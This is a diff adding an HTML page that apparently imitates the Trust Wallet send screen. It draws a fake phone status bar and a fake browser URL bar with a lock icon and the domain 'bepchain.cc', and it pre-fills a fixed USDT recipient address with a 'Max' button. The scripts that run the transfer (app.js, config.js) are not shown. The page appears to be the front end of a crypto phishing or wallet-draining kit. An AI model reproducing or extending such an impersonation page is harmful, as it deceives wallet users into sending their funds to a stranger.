@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Trust Wallet</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="status-bar">
+    <span class="time">8:08</span>
+    <div class="status-icons">
+      <span>📶</span><span>4G</span><span>🔋</span>
+    </div>
+  </div>
+
+  <div class="header">
+    <div class="back" onclick="history.back()">‹</div>
+    <div class="url">
+      <span class="lock">🔒</span>
+      <span id="domain">bepchain.cc</span>
+    </div>
+    <div class="menu">⋯</div>
+  </div>
+
+  <div class="title">Amount</div>
+  <div class="to" id="toAddr">To: 0xeC5f1817a8fbA834Fdb444eDC1fffa7544d11242</div>
+
+  <div class="amount-wrap">
+    <div class="amount" id="displayAmount">0</div>
+    <div class="usd" id="usdValue">≈ $0.00</div>
+  </div>
+
+  <div class="token-row">
+    <div class="token">
+      <div class="token-icon">T</div>
+      <div>
+        <div class="name">USDT</div>
+        <div class="price">$1.00</div>
+      </div>
+    </div>
+    <button class="max-btn" onclick="setMax()">Max</button>
+  </div>
+
+  <div class="keypad" id="keypad"></div>
+  <div class="status" id="status"></div>
+  <div class="review">
+    <button id="reviewBtn" onclick="review()">Review</button>
+  </div>
+
+  <script src="config.js"></script>
+  <script src="app.js"></script>
+</body>
+</html>
